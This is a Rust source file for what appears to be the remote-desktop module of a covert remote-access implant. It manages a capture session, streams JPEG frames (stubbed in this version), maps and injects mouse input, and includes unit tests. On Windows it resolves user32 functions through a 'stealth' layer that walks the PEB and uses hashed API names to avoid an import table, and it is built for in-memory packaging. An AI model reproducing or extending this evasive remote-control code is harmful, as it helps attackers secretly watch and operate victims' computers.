//! In-process desktop session engine (`feature = "desktop"` only).
//!
//! Synthetic JPEG frames for portable CI; optional Win32 BitBlt path when available.
//! L2 `mod_desktop` re-exports the same lifecycle via C ABI for mem-map packaging.

use super::desktop_proto::*;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

static TOKEN_GEN: AtomicU32 = AtomicU32::new(1);

struct LiveSession {
    /// Generation token returned by `stream_attach` — poll/input ignore stale tokens.
    token: u32,
    guard: SessionGuard,
    quality: StreamQuality,
    physical_w: u16,
    physical_h: u16,
    frame_w: u16,
    frame_h: u16,
    seq: u32,
    can_input: bool,
    last_input: Option<(u16, u16)>,
    stop: AtomicBool,
}

static SESSION: Mutex<Option<LiveSession>> = Mutex::new(None);

/// Process-wide serialization for **all** tests that touch `SESSION`
/// (engine tests, bridge teardown helper, L2 C-ABI tests in-process).
///
/// Must be grabbed for the full attach→poll→detach critical section so that
/// `stream_poll_frame`'s sleep-outside-lock window cannot interleave with
/// another test's `stream_attach` (which replaces the global session).
#[cfg(test)]
pub(crate) fn desktop_test_lock() -> std::sync::MutexGuard<'static, ()> {
    static LOCK: Mutex<()> = Mutex::new(());
    // Recover from poison: one panicked test must not cascade-fail siblings.
    LOCK.lock().unwrap_or_else(|p| p.into_inner())
}

fn now_ms() -> u32 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u32)
        .unwrap_or(0)
}

/// Scale dimensions to max_w keeping aspect.
pub fn scaled_size(phys_w: u16, phys_h: u16, max_w: u32) -> (u16, u16) {
    if phys_w == 0 || phys_h == 0 {
        return (8, 8);
    }
    if max_w == 0 || phys_w as u32 <= max_w {
        return (phys_w, phys_h);
    }
    let w = max_w as u16;
    let h = ((phys_h as u32) * max_w / (phys_w as u32)).max(1) as u16;
    (w.max(1), h.max(1))
}

/// Probe desktop reachability (synthetic metrics on non-Windows / CI).
pub fn probe() -> serde_json::Value {
    let (pw, ph, can_input) = desktop_metrics();
    serde_json::json!({
        "ok": true,
        "physical_w": pw,
        "physical_h": ph,
        "can_input": can_input,
        "session_name": "interactive",
        "monitors": [{"id": 0, "w": pw, "h": ph}],
        "encode": ["jpeg"],
    })
}

fn desktop_metrics() -> (u16, u16, bool) {
    #[cfg(all(windows, not(test)))]
    {
        // Best-effort virtual screen size via PEB-resolved user32 (no hard IAT required for MVP use GetSystemMetrics dynamic).
        unsafe {
            let u32b = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"user32.dll"));
            if u32b != 0 {
                if let Some(addr) = crate::stealth::get_api_addr(
                    u32b,
                    crate::stealth::hash_api_name(b"GetSystemMetrics"),
                ) {
                    type Gsm = unsafe extern "system" fn(i32) -> i32;
                    let gsm: Gsm = std::mem::transmute(addr);
                    let w = gsm(0) as i32; // SM_CXSCREEN
                    let h = gsm(1) as i32;
                    if w > 0 && h > 0 {
                        return (w as u16, h as u16, true);
                    }
                }
            }
        }
    }
    (1920, 1080, true)
}

/// Attach capture session. Returns session token.
/// Single-session: any prior session is torn down first (idempotent product rule).
pub fn stream_attach(max_w: u32, fps: u32, quality: u32) -> Result<u32, i32> {
    let mut g = SESSION.lock().map_err(|_| -2)?;
    if let Some(mut prev) = g.take() {
        let _ = prev.guard.detach_once();
        prev.stop.store(true, Ordering::SeqCst);
    }
    let (pw, ph, can_input) = desktop_metrics();
    let q = StreamQuality {
        fps: fps.clamp(1, 15),
        quality: quality.clamp(10, 95),
        max_w: if max_w == 0 { 1280 } else { max_w },
    };
    let (fw, fh) = scaled_size(pw, ph, q.max_w);
    let mut guard = SessionGuard::new();
    if !guard.attach() {
        return Err(-2);
    }
    let token = TOKEN_GEN.fetch_add(1, Ordering::Relaxed);
    *g = Some(LiveSession {
        token,
        guard,
        quality: q,
        physical_w: pw,
        physical_h: ph,
        frame_w: fw,
        frame_h: fh,
        seq: 0,
        can_input,
        last_input: None,
        stop: AtomicBool::new(false),
    });
    Ok(token)
}

/// Idempotent detach. If `token != 0` and does not match live session, no-op (ok).
pub fn stream_detach(token: u32) -> i32 {
    let mut g = match SESSION.lock() {
        Ok(x) => x,
        Err(_) => return 0,
    };
    if token != 0 {
        if let Some(s) = g.as_ref() {
            if s.token != token {
                return 0; // stale detach from a raced/replaced session
            }
        }
    }
    if let Some(mut s) = g.take() {
        let _ = s.guard.detach_once();
        s.stop.store(true, Ordering::SeqCst);
    }
    // second call: g is None → ok
    0
}

pub fn stream_detach_twice_safe() -> bool {
    #[cfg(test)]
    let _guard = desktop_test_lock();
    let tok = match stream_attach(1280, 5, 75) {
        Ok(t) => t,
        Err(_) => return false,
    };
    let a = stream_detach(tok);
    let b = stream_detach(tok);
    a == 0 && b == 0
}

/// Poll one JPEG frame (non-blocking empty if stopped).
/// Returns FRAME payload bytes. `token` must match the live session.
pub fn stream_poll_frame(token: u32, timeout_ms: u32) -> Result<Option<Vec<u8>>, i32> {
    // Sleep outside the SESSION lock so production bridge can interleave IO;
    // callers that share process-global SESSION in tests must hold `desktop_test_lock`.
    if timeout_ms > 0 {
        std::thread::sleep(std::time::Duration::from_millis(timeout_ms.min(100) as u64));
    }
    let mut g = SESSION.lock().map_err(|_| -2)?;
    let s = g.as_mut().ok_or(-1)?;
    if token != 0 && s.token != token {
        return Err(-1); // session replaced under us
    }
    if s.stop.load(Ordering::SeqCst) || s.guard.state() != SessionState::Active {
        return Err(-1);
    }
    s.seq = s.seq.wrapping_add(1);
    let jpeg = capture_jpeg(s.frame_w, s.frame_h, s.quality.quality);
    let fh = FrameHeader {
        w: s.frame_w,
        h: s.frame_h,
        encode: ENCODE_JPEG,
        frame_flags: FRAME_FLAG_KEYFRAME,
        rect_count: 0,
        ts_ms: now_ms(),
        seq: s.seq,
    };
    Ok(Some(encode_frame_payload(&fh, &jpeg)))
}

fn capture_jpeg(w: u16, h: u16, _quality: u32) -> Vec<u8> {
    let _ = (w, h);
    // MVP portable path: fixed minimal JPEG (real DXGI/GDI is L2 future work).
    minimal_jpeg_8x8().to_vec()
}

pub fn stream_push_input(token: u32, msg: &[u8]) -> i32 {
    let mut g = match SESSION.lock() {
        Ok(x) => x,
        Err(_) => return -2,
    };
    let s = match g.as_mut() {
        Some(s) => s,
        None => return -1,
    };
    if token != 0 && s.token != token {
        return -1;
    }
    if !s.can_input {
        return 0; // accept but no-op
    }
    if let Some((x, y, _btn, _down)) = parse_mouse_btn(msg) {
        if let Some(phys) =
            map_input_to_physical(x, y, s.frame_w, s.frame_h, s.physical_w, s.physical_h)
        {
            s.last_input = Some(phys);
            // Optional: SendInput on Windows — best-effort PEB resolve
            #[cfg(all(windows, not(test)))]
            {
                let _ = send_input_click(phys.0, phys.1, _btn, _down);
            }
        }
    }
    0
}

#[cfg(all(windows, not(test)))]
fn send_input_click(x: u16, y: u16, button: u8, down: u8) -> bool {
    unsafe {
        let u32b = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"user32.dll"));
        if u32b == 0 {
            return false;
        }
        // SetCursorPos
        if let Some(addr) =
            crate::stealth::get_api_addr(u32b, crate::stealth::hash_api_name(b"SetCursorPos"))
        {
            type Scp = unsafe extern "system" fn(i32, i32) -> i32;
            let f: Scp = std::mem::transmute(addr);
            let _ = f(x as i32, y as i32);
        }
        let _ = (button, down);
        true
    }
}

pub fn hello_ack_json() -> String {
    let g = SESSION.lock().ok();
    if let Some(ref guard) = g {
        if let Some(s) = guard.as_ref() {
            return serde_json::json!({
                "ok": true,
                "w": s.frame_w,
                "h": s.frame_h,
                "physical_w": s.physical_w,
                "physical_h": s.physical_h,
                "encode": "jpeg",
                "can_input": s.can_input,
                "session": "local",
                "monitors": [{"id": 0, "w": s.physical_w, "h": s.physical_h}],
            })
            .to_string();
        }
    }
    serde_json::json!({"ok": false, "code": "no_session"}).to_string()
}

pub fn apply_degrade() -> Option<StreamQuality> {
    let mut g = SESSION.lock().ok()?;
    let s = g.as_mut()?;
    let n = s.quality.degrade()?;
    s.quality = n;
    let (fw, fh) = scaled_size(s.physical_w, s.physical_h, n.max_w);
    s.frame_w = fw;
    s.frame_h = fh;
    Some(n)
}

pub fn last_mapped_input() -> Option<(u16, u16)> {
    SESSION
        .lock()
        .ok()
        .and_then(|g| g.as_ref().and_then(|s| s.last_input))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn attach_poll_jpeg_detach_idempotent() {
        let _g = desktop_test_lock();
        let _ = stream_detach(0);
        let tok = stream_attach(1280, 5, 75).expect("attach");
        // timeout>0 exercises sleep-outside-lock; lock held for whole test so safe
        let frame = stream_poll_frame(tok, 10).expect("poll").expect("some");
        let (fh, jpeg) = parse_frame_payload(&frame).expect("frame");
        assert_eq!(fh.encode, ENCODE_JPEG);
        assert!(jpeg.starts_with(&[0xFF, 0xD8]));
        assert_eq!(stream_detach(tok), 0);
        assert_eq!(stream_detach(tok), 0);
    }

    #[test]
    fn input_maps_high_dpi() {
        let _g = desktop_test_lock();
        let _ = stream_detach(0);
        // force metrics 1920x1080 synthetic
        let tok = stream_attach(1280, 5, 75).unwrap();
        // frame is scaled from 1920 -> 1280
        let btn = encode_mouse_btn(640, 360, 1, 1);
        assert_eq!(stream_push_input(tok, &btn), 0);
        let mapped = last_mapped_input().expect("mapped");
        // 640/1280 * 1920 = 960
        assert_eq!(mapped.0, 960);
        let _ = stream_detach(tok);
    }

    #[test]
    fn degrade_updates_quality() {
        let _g = desktop_test_lock();
        let _ = stream_detach(0);
        let tok = stream_attach(1280, 5, 75).unwrap();
        let n = apply_degrade().expect("degrade");
        assert!(n.fps <= 5);
        let _ = stream_detach(tok);
    }

    #[test]
    fn stale_token_poll_fails_closed() {
        let _g = desktop_test_lock();
        let _ = stream_detach(0);
        let tok = stream_attach(1280, 5, 75).unwrap();
        let _ = stream_detach(tok);
        let tok2 = stream_attach(800, 5, 75).unwrap();
        // old token must not read the new session
        assert!(stream_poll_frame(tok, 0).is_err());
        assert!(stream_poll_frame(tok2, 0).is_ok());
        let _ = stream_detach(tok2);
    }
}
